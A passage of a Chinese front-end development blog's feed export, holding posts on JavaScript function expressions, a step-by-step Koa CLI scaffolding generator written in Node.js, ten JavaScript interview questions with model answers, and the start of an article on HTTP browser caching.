href="#立即执行函数iife"></a> 立即执行函数（IIFE）</h4><p>IIFE - 立即调用函数表达式 - 就是字面意思。在创建函数后立即调用函数，使用IIFE，如下所示：</p><pre><code class="hljs plaintext">(function() =&gt; &#123;&#125;)()//或者(() =&gt; &#123;&#125;)()</code></pre><h4 id="回调callback"><a class="markdownIt-Anchor" href="#回调callback"></a> 回调（callback）</h4><p>传递给另一个函数的函数通常在JavaScript中称为“回调”。，如下所示：</p><pre><code class="hljs plaintext">function mapAction(item) &#123;  // do stuff to an item&#125;array.map(mapAction)</code></pre><p>这里的问题是mapAction可用于整个应用程序- 其实没有必要。如果该回调是一个函数表达式，它在函数外就不可用了：</p><pre><code class="hljs plaintext">array.map(item =&gt; &#123; //do stuff to an item &#125;)//或者const mapAction = function(item) &#123;  // do stuff to an item&#125;array.map(mapAction)</code></pre><p>虽然<code>mapAction</code>函数只有在他初始化之后才能使用</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>简而言之，如果要在全局范围内创建函数并在整个代码中使用它，请使用函数声明。</p><p>使用函数表达式来限制函数的可用位置，保持全局环境的整洁干净。<br />————————————————————————————————————————————————</p><p>放学别走！长按二维码关注 【技术人生路】，无偿免费获取前端学习进阶资料，培训实战视频，就业指导等众多福利哦。我相信我们都是爱学习爱进步的呀！</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/10/16aa05e97ba82933?w=258&amp;h=258&amp;f=jpeg&amp;s=28158" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们在日常开发中经常使用函数，聪明的你肯定已经用的炉火纯青了。&lt;code&gt;function doStuff（）&amp;#123;&amp;#125;&lt;/code&gt;和&lt;code&gt;（）=&amp;gt; &amp;#123;&amp;#125;&lt;/code&gt;是我们整天输入的字符。但它们有何不同，为什么使用另一个呢？</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>手把手教你实现脚手架工具Koa-generator</title>
    <link href="https://harrypangpang.github.io/2019/05/09/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7Koa-generator/"/>
    <id>https://harrypangpang.github.io/2019/05/09/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7Koa-generator/</id>
    <published>2019-05-09T08:36:13.000Z</published>
    <updated>2023-02-23T03:30:13.100Z</updated>
    
    <content type="html"><![CDATA[<p>我们日常中经常使用各种cli来加速我们的工作，你们也一定和我一样想知道这些cli内部都干了什么？接下来我们就以实现一个koa-generator来打开脚手架工具的大门，来跟着我一步一步做吧：</p><p><code>为了加快我们的学习进度，更快的理解cli，我们这里会省略一些内容，旨在帮助大家更快建立基本的概念和入门方法</code></p><h3 id="需求分析"><a class="markdownIt-Anchor" href="#需求分析"></a> 需求分析</h3><p>首先我们先对我们要实现的工具做一个简单的需求分析：</p><ol><li>自动化生成koa初始项目结构</li><li>可以自定义一些内容</li><li>发布</li></ol><p>是不是很简单？没错，真的很简单！</p><h3 id="逐步实现"><a class="markdownIt-Anchor" href="#逐步实现"></a> 逐步实现</h3><h4 id="1"><a class="markdownIt-Anchor" href="#1"></a> 1</h4><p>想要自动化生成koa初始项目结构的前提，就是要知道我们构建出来的结构是什么样的：</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/9/16a9b4ab026e0644?w=299&amp;h=371&amp;f=png&amp;s=17255" alt="" /></p><p>上图就是我们想要生成的项目结构</p><p>明确了我们的目的接下来就开始着手吧！</p><h4 id="2"><a class="markdownIt-Anchor" href="#2"></a> 2</h4><h4 id="21"><a class="markdownIt-Anchor" href="#21"></a> 2.1</h4><p>创建文件夹</p><pre><code class="hljs plaintext">mkdir koa-simple-generator</code></pre><h4 id="22"><a class="markdownIt-Anchor" href="#22"></a> 2.2</h4><p>进入项目目录</p><pre><code class="hljs plaintext">cd koa-simple-generator</code></pre><h4 id="23"><a class="markdownIt-Anchor" href="#23"></a> 2.3</h4><p>初始化npm（等不及实践就一路enter，后面也可以再做修改）</p><pre><code class="hljs plaintext">npm init</code></pre><h4 id="24"><a class="markdownIt-Anchor" href="#24"></a> 2.4</h4><p>打开我们的package.json，如下</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/9/16a9b511c3717d41?w=498&amp;h=235&amp;f=png&amp;s=14605" alt="" /></p><p>将下面的代码复制到package.json里</p><pre><code class="hljs plaintext">&#123;  &quot;name&quot;: &quot;koa-simple-generator&quot;,  &quot;version&quot;: &quot;1.0.0&quot;,  &quot;description&quot;: &quot;&quot;,  &quot;scripts&quot;: &#123;    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;  &#125;,  &quot;author&quot;: &quot;&quot;,  &quot;license&quot;: &quot;ISC&quot;,  &quot;main&quot;: &quot;bin/wowKoa&quot;,  &quot;bin&quot;: &#123;    &quot;koa2&quot;: &quot;./bin/wowKoa&quot;  &#125;,  &quot;dependencies&quot;: &#123;    &quot;commander&quot;: &quot;2.7.1&quot;,    &quot;mkdirp&quot;: &quot;0.5.1&quot;,    &quot;sorted-object&quot;: &quot;1.0.0&quot;  &#125;,  &quot;devDependencies&quot;: &#123;    &quot;mocha&quot;: &quot;2.2.5&quot;,    &quot;rimraf&quot;: &quot;~2.2.8&quot;,    &quot;supertest&quot;: &quot;1.0.1&quot;  &#125;,  &quot;engines&quot;: &#123;    &quot;node&quot;: &quot;&gt;= 7.0&quot;  &#125;&#125;</code></pre><pre><code class="hljs plaintext">1. dependencies和devDependencies简单来说就是应用的依赖包，devDependencies只会在开发环境安装2. 这句话的意思是我们的这个工具需要node7.0及以上的版本才能支持&quot;engines&quot;: &#123;    &quot;node&quot;: &quot;&gt;= 7.0&quot;  &#125;重点是这两句&quot;main&quot;: &quot;bin/wowKoa&quot;,  &quot;bin&quot;: &#123;    &quot;wowKoa&quot;: &quot;./bin/wowKoa&quot;  &#125;,  意思是默认执行的是bin目录下的wowKoa，  执行wowKoa的命令，执行的也是bin目录下的wowKoa，</code></pre><p>####2.5<br />接下来安装我们的依赖吧</p><pre><code class="hljs plaintext">npm i</code></pre><h4 id="26"><a class="markdownIt-Anchor" href="#26"></a> 2.6</h4><p>安装完，我们新建一个目录template</p><pre><code class="hljs plaintext">mkdir template</code></pre><p>然后我们可以把我们想要生成的目录结构拷贝进去，这里我就只是把koa2的目录拷贝进去，现在我们的目录长这样：</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/9/16a9b5f29ca24773?w=256&amp;h=240&amp;f=png&amp;s=10184" alt="" /></p><h4 id="27"><a class="markdownIt-Anchor" href="#27"></a> 2.7</h4><p>新建bin目录，在bin下新建文件wowKoa</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/9/16a9b632f0c8d54e?w=314&amp;h=166&amp;f=png&amp;s=7354" alt="" /></p><h4 id="28"><a class="markdownIt-Anchor" href="#28"></a> 2.8</h4><p>接下来就是关键了，我们的所有工作都是在bin下的wowKoa文件里完成的<br />直接复制粘贴下面的，然后进入项目目录运行<code>node bin/wowKoa</code>就能看到结果了</p><p><em>代码我已经大部分都注释啦</em></p><pre><code class="hljs plaintext">#!/usr/bin/env node // 告诉Unix和Linux系统这个文件中的代码用node可执行程序去运行var program = require(&#x27;commander&#x27;);var mkdirp = require(&#x27;mkdirp&#x27;);var os = require(&#x27;os&#x27;);var fs = require(&#x27;fs&#x27;);var fsm = require(&#x27;fs-extra&#x27;)var path = require(&#x27;path&#x27;);var readline = require(&#x27;readline&#x27;);var pkg = require(&#x27;../package.json&#x27;);// 退出node进程var _exit = process.exit;// s.EOL属性是一个常量，返回当前操作系统的换行符（Windows系统是\r\n，其他系统是\n）var eol = os.EOL;var version = pkg.version;// Re-assign process.exit because of commander// TODO: Switch to a different command frameworkprocess.exit = exitprogram    /**     * .version(&#x27;0.0.1&#x27;, &#x27;-v, --version&#x27;)     * 1版本号&lt;必须&gt;,     * 2自定义标志&lt;可省略&gt;：默认为 -V 和 --version     *      * .option(&#x27;-n, --name&lt;path&gt;&#x27;, &#x27;name description&#x27;, &#x27;default name&#x27;)     * 1 自定义标志&lt;必须&gt;：分为长短标识，中间用逗号、竖线或者空格分割；标志后面可跟必须参数或可选参数，前者用 &lt;&gt; 包含，后者用 [] 包含     * 2 选项描述&lt;省略不报错&gt;：在使用 --help 命令时显示标志描述     * 3 默认值&lt;可省略&gt;     *      * .usage(&#x27;[options] [dir]&#x27;)     * 作用：只是打印用法说明     *      * .parse(process.argv)     * 作用：用于解析process.argv，设置options以及触发commands     * process.argv获取命令行参数     *      *      * Commander提供了api来取消未定义的option自动报错机制， .allowUnknownOption()     */    .version(version, &#x27;-v, --version&#x27;)    .allowUnknownOption()    .usage(&#x27;[options] [dir]&#x27;)    .option(&#x27;-f, --force&#x27;, &#x27;force on non-empty directory&#x27;)    .parse(process.argv);// 没有退出时执行主函数if (!exit.exited) &#123;    main();&#125;/** * 主函数 */function main() &#123;    // 获取当前命令执行路径    var destinationPath = program.args.shift() || &#x27;.&#x27;;    // 根据文件夹名称定义appname    // 用于package.json里的name    var appName = path.basename(path.resolve(destinationPath));    // 判断当前文件目录是否为空    emptyDirectory(destinationPath, function (empty) &#123;        // 如果为空或者强制执行时，就直接生成项目        if (empty || program.force) &#123;            createApplication(appName, destinationPath);        &#125; else &#123;            // 否则询问            confirm(&#x27;当前文件夹不为空，是否继续？[y/N] &#x27;, function (ok) &#123;                if (ok) &#123;                        // 控制台不再输入时销毁                        process.stdin.destroy();                        createApplication(appName, destinationPath);                &#125; else &#123;                    console.error(&#x27;aborting&#x27;);                    exit(1);                &#125;            &#125;);        &#125;    &#125;)&#125;/** * Check if the given directory `path` is empty. * 判断文件夹是否为空 * @param &#123;String&#125; path * @param &#123;Function&#125; fn */function emptyDirectory(path, fn) &#123;    fs.readdir(path, function (err, files) &#123;        if (err &amp;&amp; &#x27;ENOENT&#x27; != err.code) throw err;        fn(!files || !files.length);    &#125;);&#125;/** * 在给定路径中创建应用 * @param &#123;String&#125; path */function createApplication(app_name, path) &#123;    // wait的值等于complete函数执行的次数    // 用于选择在哪一次complete函数执行后执行控制台打印引导使用的文案    var wait = 1;    console.log();    function complete() &#123;        if (--wait) return;        var prompt = launchedFromCmd() ? &#x27;&gt;&#x27; : &#x27;$&#x27;;        console.log();        console.log(&#x27;   install dependencies:&#x27;);        console.log(&#x27;     %s cd %s &amp;&amp; npm install&#x27;, prompt, path);        console.log();        console.log(&#x27;   run the app:&#x27;);        // 根据控制台的环境不同打印不同文案（linux或者win）        if (launchedFromCmd()) &#123;            console.log(&#x27;     %s SET DEBUG=koa* &amp; npm start&#x27;, prompt, app_name);        &#125; else &#123;            console.log(&#x27;     %s DEBUG=%s:* npm start&#x27;, prompt, app_name);        &#125;    &#125;    copytmp(complete, path,app_name)&#125;// 拷贝模拟里的文件到本地function copytmp(fn, destinationPath,app_name) &#123;    // 获取模板文件的文件目录    tmpPath = path.join(__dirname, &#x27;..&#x27;, &#x27;template&#x27;)    // 创建目录    fsm.ensureDir(destinationPath + &#x27;/&#x27;+app_name)        .then(() =&gt; &#123;            // 拷贝模板            fsm.copy(tmpPath, destinationPath + &#x27;/&#x27;+app_name, err =&gt; &#123;                if (err) return console.log(err)                fn()            &#125;)        &#125;)&#125;/** * Determine if launched from cmd.exe * 判断控制台环境（liux或者win获取其他） */function launchedFromCmd() &#123;    return process.platform === &#x27;win32&#x27; &amp;&amp;        process.env._ === undefined;&#125;/** * node是使用process.stdin和process.stdout来实现标准输入和输出的 * readline 模块提供了一个接口，用于一次一行地读取可读流（例如 process.stdin）中的数据。 它可以使用以下方式访问： */var rl = readline.createInterface(&#123;    input: process.stdin,    output: process.stdout&#125;);// 控制台问答function confirm(msg, callback) &#123;    rl.question(msg, function (input) &#123;        callback(/^y|yes|ok|true$/i.test(input));    &#125;);&#125;// 控制台问答function wrieQuestion(msg, callback) &#123;    rl.question(msg, function (input) &#123;        // rl.close()后就不再监听控制台输入了        rl.close();        callback(input)    &#125;);&#125;/** * 通过fs读取模板文件内容 */function loadTemplate(name) &#123;    return fs.readFileSync(path.join(__dirname, &#x27;..&#x27;, &#x27;template&#x27;, name), &#x27;utf-8&#x27;);&#125;/** * echo str &gt; path. * 写入文件 * @param &#123;String&#125; path * @param &#123;String&#125; str */function write(path, str, mode) &#123;    fs.writeFileSync(path, str, &#123; mode: mode || 0666 &#125;);    console.log(&#x27;   \x1b[36mcreate\x1b[0m : &#x27; + path);  &#125;/** * 这里是主要解决在winodws上的一些bug，不用卡在这里，核心目的就是为了能让进程优雅退出 * Graceful exit for async STDIO */function exit(code) &#123;    // flush output for Node.js Windows pipe bug    // https://github.com/joyent/node/issues/6247 is just one bug example    // https://github.com/visionmedia/mocha/issues/333 has a good discussion    function done() &#123;        if (!(draining--)) _exit(code);    &#125;    var draining = 0;    var streams = [process.stdout, process.stderr];    exit.exited = true;    streams.forEach(function (stream) &#123;        // submit empty write request and wait for completion        draining += 1;        stream.write(&#x27;&#x27;, done);    &#125;);    done();&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们日常中经常使用各种cli来加速我们的工作，你们也一定和我一样想知道这些cli内部都干了什么？接下来我们就以实现一个koa-generator来打开脚手架工具的大门，来跟着我一步一步做吧：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;为了加快我们的学习进度，更快的理解cli，我们这里会省略</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>10个前端面试必会题目！（适用于中高级）</title>
    <link href="https://harrypangpang.github.io/2019/05/07/10%E4%B8%AA%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%BF%85%E4%BC%9A%E9%A2%98/"/>
    <id>https://harrypangpang.github.io/2019/05/07/10%E4%B8%AA%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%BF%85%E4%BC%9A%E9%A2%98/</id>
    <published>2019-05-07T09:04:14.000Z</published>
    <updated>2023-02-23T03:30:13.095Z</updated>
    
    <content type="html"><![CDATA[<p>现在大部分公司的管理者都会通过技术面试来考察开发者的能力。如果你成为了候选人，那你一定需要去经历面试。</p><p>大部分的面试相信大家一定经历过，但是其实我们不应该过度关注于语法和一些怪异生僻的特性中。诚然这些能考察到候选人的基础功扎实与否，但我们应该更多的是从全局来考虑，询问架构和范例（这方面决定会对整个项目有重大的影响）。</p><p>语法和特性其实都能在谷歌中找到。但是软件工程师的智慧和JS开发者在经验中获得的通用范例和用法是无法从谷歌中获得的。</p><p>Javascript是特殊的，他现在几乎在所有大型应用中都扮演中重要的角色。那你又知道JS和其他的语言有什么不同之处吗？</p><p>接下来的几个问题会帮助你探索真正需要关注的内容：</p><h3 id="1-你能说出两个在javascript中很重要的编程范式吗"><a class="markdownIt-Anchor" href="#1-你能说出两个在javascript中很重要的编程范式吗"></a> 1. 你能说出两个在Javascript中很重要的编程范式吗？</h3><p>Javascript是多范式语言：<strong>命令式/过程式，函数式，面向对象</strong>。Javascript支持通过<strong>原型继承</strong>实现面向对象编程</p><p><strong>优秀回答：</strong></p><ul><li>原型继承（或者原型）</li><li>函数式编程（闭包，一等函数，lambda演算，箭头函数）</li></ul><p><strong>红色预警：</strong><br />-不知道范式是什么，也没有提及原型面向对象或者函数式编程</p><p>参考：</p><p><a href="https://www.cnblogs.com/sirkevin/p/8283110.html">https://www.cnblogs.com/sirkevin/p/8283110.html</a></p><p><a href="https://www.cnblogs.com/nunn/p/3460175.html">https://www.cnblogs.com/nunn/p/3460175.html</a></p><h3 id="2什么是函数式编程"><a class="markdownIt-Anchor" href="#2什么是函数式编程"></a> 2.什么是函数式编程</h3><p>函数式编程，可以归结为面向过程的程序设计，但是结合了更多的数学计算的思想。函数式编程就是一种抽象程度很高的编程范式，纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。而允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。</p><p>函数式编程是JavaScript中的一个基本概念（JavaScript两大支柱之一（原型继承和函数式编程））</p><p><strong>优秀回答：</strong></p><ul><li>纯函数</li><li>避免副作用</li><li>简单的函数功能组合</li><li>函数语言的例子：Lisp，ML，Haskell，Erlang，Clojure，Elm，F Sharp，OCaml等…</li><li>提到函数式编程的功能：一等函数，高阶函数，函数作为参数/值</li></ul><p><strong>红色预警：</strong></p><ul><li>没有提到纯函数，或者避免副作用</li><li>无法提供函数式编程语言的示例</li><li>无法识别启用函数式编程的JavaScript功能</li></ul><h3 id="3类继承和原型继承有什么区别"><a class="markdownIt-Anchor" href="#3类继承和原型继承有什么区别"></a> 3.类继承和原型继承有什么区别</h3><p><strong>类继承：</strong> JavaScript本来是没有类继承的，我们可以通过关键词new来将构造函数实例化，call和apply方法为类式继承提供了支持。通过改变this的作用环境，使得子类本身具有父类的各种属性。当然，我们现在拥有了ES6的calss，也可以使用calss来实现类继承。</p><p><strong>原型继承：</strong> 实例直接从其他对象继承。实例通常通过工厂函数或“Object.create()”实例化。实例可以由许多不同的对象组成，从而可以方便地选择继承。</p><blockquote><p>在JavaScript中，原型继承比类继承更简单、更灵活。</p></blockquote><p><strong>优秀回答：</strong></p><ul><li>类继承：紧密耦合或基于层级的分类</li><li>原型继承：提到了原型委托，功能继承，对象组合。</li><li></li></ul><p><strong>红色预警：</strong></p><ul><li>不依赖于原型继承和而类继承的组合</li></ul><h3 id="4函数式编程与面向对象编程的优缺点是什么"><a class="markdownIt-Anchor" href="#4函数式编程与面向对象编程的优缺点是什么"></a> 4.函数式编程与面向对象编程的优缺点是什么？</h3><p><strong>面向对象编程的优点：</strong><br />很容易理解对象的基本概念，也很容易解释调用方法的含义。面向对象编程更倾向于命令式而不是声明式，声明式读起来就像是给计算机遵循的直接命令</p><p><strong>面向对象编程的缺点：</strong><br />面向对象编程通常依赖于共享状态。对象和行为通常连接在同一个实体上，该实体可以被任意数量的顺序不确定的函数随机访问，这可能导致不需要的行为，如竞争条件。</p><p><strong>函数式编程的优点：</strong><br />使用函数式编程，程序员可以避免任何共享状态或副作用，从而消除由于多个函数争夺相同资源而导致的错误。与面向对象编程相比，函数式编程从根本上简化，并易于重新组合，以获得更普遍可重用的代码。</p><p>函数式编程倾向于声明式和外延式，它们不详细说明操作的一步一步的指令，而是专注于做什么，让底层函数来处理如何做。这为重构和性能优化留下了巨大的空间，甚至允许你用更高效的算法替换整个算法，而只需很少的代码更改。</p><p>使用纯函数进行计算，也容易跨多个处理器或跨分布式计算集群扩展，而无需担心线程资源冲突、竞争条件等问题。</p><p><strong>函数式编程的缺点：</strong><br />过度使用函数式编程特性(如大型组合)可能会降低可读性，因为生成的代码通常更抽象、更简洁、更不具体。</p><p>与函数式编程相比，更多人熟悉面向对象编程和命令式编程，因此即使是函数式编程中的常见习惯用法也可能让新团队成员感到困惑。</p><p>函数式编程的学习曲线要比面向对象编程陡峭得多，因为面向对象编程的广泛流行使面向对象编程的语言和学习材料变得更加语义化，而函数式编程的语言则趋向于更加学术化和形式化。函数式编程概念经常涉及到使用lambda演算、代数和范畴理论中的习惯用法和符号，所有这些都需要去了解这些领域的知识。</p><p><strong>优秀回答：</strong></p><ul><li>提到共享状态的问题，竞争相同资源的不同事物等等…</li><li>意识到函数式编程能够从根本上简化许多应用程序。</li><li>意识到学习曲线的差异。</li><li>阐明副作用以及它们如何影响程序的可维护性。</li><li>意识到功能强大的代码库可能具有陡峭的学习曲线。</li><li>意识到与同等的函数式编程代码库相比，过多的OOP代码会非常难以应对变化并且非常脆弱。</li></ul><p><strong>红色预警：</strong></p><ul><li>无法列出一种风格或另一种风格的缺点 - 任何一种风格都有其不足。</li></ul><h3 id="5-什么时候适合选择类继承"><a class="markdownIt-Anchor" href="#5-什么时候适合选择类继承"></a> 5. 什么时候适合选择类继承？</h3><p>答案是啥时候都不适合，多层次的类结构是反模式。<br /><strong>优秀回答：</strong></p><ul><li>很少，几乎从来没有，或从未</li><li>单级别的时候有时候是可以的，比如React.Component</li><li>对象继承比类继承更好</li></ul><h3 id="6-什么时候适合原型继承"><a class="markdownIt-Anchor" href="#6-什么时候适合原型继承"></a> 6. 什么时候适合原型继承？</h3><p>原型继承有多种类型：</p><ul><li>原型链</li><li>mixins，Object.assign()</li><li>函数式（别和函数式编程混淆，这里是创建闭包函数实现私有状态/封装）</li></ul><p>每种类型的原型继承都有自己的创建方法，但是它们合成对象的能力都一样，它创建了has-a或uses-a或can-do关系，而不是类继承创建的is-a的关系。</p><p><strong>优秀回答：</strong></p><ul><li>在模块或函数编程没有提供明显解决方案的情况下</li><li>当需要从多个地方组合对象时</li><li>任何需要继承的地方</li></ul><p><strong>红色预警：</strong></p><ul><li>不知道何时使用原型。</li><li>没有意识到mixins或<code>Object.assign（）</code></li></ul><h3 id="7-对象继承比类继承更好是为什么"><a class="markdownIt-Anchor" href="#7-对象继承比类继承更好是为什么"></a> 7. 对象继承比类继承更好是为什么</h3><p>代码重用应该通过将较小的功能单元组装到新对象中来实现，而不是继承类并创建对象分类法。</p><p>换句话说，使用can-do，has-a或使用关系而不是is-a关系。<br /><strong>优秀回答：</strong></p><ul><li>避免使用类层次结构</li><li>避免脆弱的类问题</li><li>避免紧密耦合</li><li>避免严格的分类（强制is-a关系对于新的代码使用是不友好的）</li><li>避免大猩猩香蕉问题（“你想要的是香蕉，你得到的是拿着香蕉的大猩猩，以及整个丛林”）</li><li>使代码更灵活</li></ul><p><strong>红色预警：</strong></p><ul><li>上面的一个都不知道</li></ul><h3 id="8-什么是双向数据绑定和单向数据流它们有何不同"><a class="markdownIt-Anchor" href="#8-什么是双向数据绑定和单向数据流它们有何不同"></a> 8. 什么是双向数据绑定和单向数据流，它们有何不同？</h3><p>双向数据绑定意味着View层数据变化，Model层的数据也会相应变化，反之亦然。</p><p>单向数据流意味着Model层数据变化会引起View层数据变化，但View层数据变化无法引起Model层的数据变化，数据总是朝着一个方向流动（就像React里的store）。这使得理解起来更容易。</p><p>单向数据流具有是确定性的，而双向绑定可能导致更难以遵循和理解的副作用。</p><p><strong>优秀回答：</strong></p><ul><li>React是单向数据流的范例，因此提及React是一个很好的信号。 Cycle.js是单向数据流的另一种流行实现。</li><li>Angular/Vue是一种使用双向绑定的流行框架。</li></ul><p><strong>红色预警：</strong></p><ul><li>不了解任何一个意味着什么，无法阐明差异。</li></ul><h3 id="9单体架构与微服务架构的优缺点是什么"><a class="markdownIt-Anchor" href="#9单体架构与微服务架构的优缺点是什么"></a> 9.单体架构与微服务架构的优缺点是什么？</h3><p>所谓的单体架构就是把所有的业务模块编写在一个项目中，最终会打包成一个war包，然后进行部署</p><p>微服务架构意味着应用程序由许多较小的独立应用程序组成，这些应用程序能够在自己的内存空间中运行，并且可能在许多不同的机器上相互独立地进行扩展和协作。</p><p><strong>单体架构优点：</strong></p><p>单片架构的主要优点是大多数应用程序可以共用很多东西，例如日志记录，速率限制以及审计跟踪和DOS保护等安全功能。</p><p>还有性能优势，因为共享内存访问比进程间通信（IPC）更快。</p><p><strong>单体架构缺点：</strong><br />随着应用程序的发展，应用程序服务往往会紧密耦合和纠缠，从而难以将服务隔离并独立扩展出来，并且实现代码可维护性等。<br />单体架构也很难理解，因为当你查看特定服务或控制器时，可能存在依赖性，副作用等不明显的隐形问题</p><p>它们还可以根据组织方式获得性能优势，因为可以独立于应用程序的其他部分，与核心服务隔离并对其进行伸缩。</p><p><strong>微服务架构优点</strong><br />微服务体系结构通常组织得更好，因为每个微服务都有一个非常特定的任务，并且不关心其他组件的任务。解耦的服务也更容易重新组合和配置，以满足不同应用程序的需要(例如，同时服务于web客户机和公共API)。</p><p><strong>微服务架构缺点</strong><br />微服务部署在虚拟机或容器上，导致VM争用工作激增。<br />运维复杂度提供</p><p><strong>优秀回答：</strong></p><ul><li>微服务架构一开始成本较高，但微服务从长远来看往往会表现更好并且规模更大。</li><li>关于微服务和单片应用程序的实用性。两者在不同情况下的使用选择</li></ul><p><strong>红色预警：</strong></p><ul><li>不了解单体架构和微服务架构之间的差异。</li><li>对微服务的额外开销没有意识到。</li><li>不知道IPC和网络通信对微服务造成的额外性能开销。</li><li>无法明确解决单片应用程序的分离方式，以便在时机成熟时将它们轻松拆分为微服务。</li><li>低估了独立可扩展微服务的优势。</li></ul><h3 id="10-什么是异步编程为什么它在javascript中很重要"><a class="markdownIt-Anchor" href="#10-什么是异步编程为什么它在javascript中很重要"></a> 10. 什么是异步编程，为什么它在JavaScript中很重要？</h3><p>同步编程意味着，除了条件和函数调用之外，代码从上到下依次执行，阻塞长时间运行的任务，如网络请求和磁盘I / O等。</p><p>异步编程意味着引擎在一个事件循环中运行。当需要阻塞操作时，将启动请求，并且代码将继续运行，而不会阻塞结果。当响应就绪时，将触发一个中断，这时运行一个事件处理程序，其中控制流将继续运行。通过这种方式，一个程序线程可以处理许多并发操作。</p><p>用户界面本质上是异步的，并且花费大部分时间等待用户输入来中断事件循环并触发事件处理程序。</p><p>默认情况下，Node是异步的，这意味着服务器的工作方式大致相同，在循环中等待网络请求，并在处理第一个请求时接受更多的传入请求。</p><p>这在JavaScript中很重要，因为它非常适合UI代码，并且非常有利于服务器上的性能。</p><p><strong>优秀回答：</strong></p><ul><li>了解阻塞意味着什么，以及性能影响。</li><li>了解事件处理，以及为什么它对UI代码很重要。</li></ul><p><strong>红色预警：</strong></p><ul><li>不熟悉异步或同步的术语。</li><li>无法阐明性能影响或异步代码与UI代码之间的关系。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;现在大部分公司的管理者都会通过技术面试来考察开发者的能力。如果你成为了候选人，那你一定需要去经历面试。&lt;/p&gt;
&lt;p&gt;大部分的面试相信大家一定经历过，但是其实我们不应该过度关注于语法和一些怪异生僻的特性中。诚然这些能考察到候选人的基础功扎实与否，但我们应该更多的是从全局来考</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>强制缓存（200）和协商缓存（304）</title>
    <link href="https://harrypangpang.github.io/2019/05/06/%E5%BC%BA%E5%88%B6%E7%BC%93%E5%AD%98%EF%BC%88200%EF%BC%89%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%88304%EF%BC%89/"/>
    <id>https://harrypangpang.github.io/2019/05/06/%E5%BC%BA%E5%88%B6%E7%BC%93%E5%AD%98%EF%BC%88200%EF%BC%89%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%88304%EF%BC%89/</id>
    <published>2019-05-06T09:09:18.000Z</published>
    <updated>2023-02-23T03:30:13.100Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍强制缓存（200）和协商缓存（304）的区别</p><h4 id="1-什么是缓存"><a class="markdownIt-Anchor" href="#1-什么是缓存"></a> 1. 什么是缓存？</h4><p>浏览器缓存(Brower Caching)是浏览器对之前请求过的文件进行缓存，以便下一次访问时重复使用，节省带宽，提高访问速度，降低服务器压力</p><p>http缓存机制主要在http响应头中设定，响应头中相关字段为Expires、Cache-Control、Last-Modified、If-Modified-Since、Etag。</p><p>HTTP 1.0协议中的。简而言之，就是告诉浏览器在约定的这个时间前，可以直接从缓存中获取资源（representations），而无需跑到服务器去获取。</p><p>另：Expires因为是对时间设定的，且时间是Greenwich Mean Time （GMT），而不是本地时间，所以对时间要求较高。</p><h4 id="2-浏览器是如何判断是否使用缓存的"><a class="markdownIt-Anchor" href="#2-浏览器是如何判断是否使用缓存的"></a> 2. 浏览器是如何判断是否使用缓存的</h4><p>第一次请求：</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/6/16a8bbc2df77f4f6?w=411&amp;h=369&amp;f=png&amp;s=26885" alt="" /><br />第二次请求相同网页：</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/6/16a8bbaefa56810f?w=554&amp;h=528&amp;f=png&amp;s=103197" alt="" /></p><h4 id="3-缓存的类别"><a class="markdownIt-Anchor" href="#3-缓存的类别"></a> 3. 缓存的类别</h4><p>浏览器缓存分为强缓存和协商缓存</p><h5 id="强缓存浏览器不会像服务器发送任何请求直接从本地缓存中读取文件并返回status-code-200-ok"><a class="markdownIt-Anchor" href="#强缓存浏览器不会像服务器发送任何请求直接从本地缓存中读取文件并返回status-code-200-ok"></a> 强缓存：浏览器不会像服务器发送任何请求，直接从本地缓存中读取文件并返回Status Code: 200 OK</h5><p><img src="https://user-gold-cdn.xitu.io/2019/5/6/16a8bc0c7e54f6ec?w=317&amp;h=112&amp;f=png&amp;s=9790" alt="" /></p><p><img src="https://user-gold-cdn.xitu.io/2019/5/6/16a8bdbc4b9c8720?w=280&amp;h=96&amp;f=png&amp;s=7498" alt="" /></p><blockquote><p>200 form memory cache :<br />不访问服务器，一般已经加载过该资源且缓存在了内存当中，直接从内存中读取缓存。浏览器关闭后，数据将不存在（资源被释放掉了），再次打开相同的页面时，不会出现from memory cache。</p></blockquote><blockquote><p>200 from disk cache：<br />不访问服务器，已经在之前的某个时间加载过该资源，直接从硬盘中读取缓存，关闭浏览器后，数据依然存在，此资源不会随着该页面的关闭而释放掉下次打开仍然会是from disk cache。</p></blockquote><blockquote><p>优先访问memory cache,其次是disk cache，最后是请求网络资源</p></blockquote><h5 id="协商缓存-向服务器发送请求服务器会根据这个请求的request-header的一些参数来判断是否命中协商缓存如果命中则返回304状态码并带上新的response-header通知浏览器从缓存中读取资源"><a class="markdownIt-Anchor" 